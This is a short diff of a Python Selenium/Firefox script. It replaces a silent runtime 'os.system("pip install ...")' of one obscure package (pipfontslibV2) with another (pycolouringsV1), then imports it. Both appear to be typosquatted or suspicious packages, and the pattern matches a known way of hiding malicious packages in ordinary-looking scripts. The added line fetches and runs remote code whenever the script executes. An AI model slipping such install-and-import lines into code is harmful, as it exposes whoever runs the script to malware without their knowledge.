@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontslibV2")
-import pipfontslibV2
+os.system("pip install pycolouringsV1")
+import pycolouringsV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
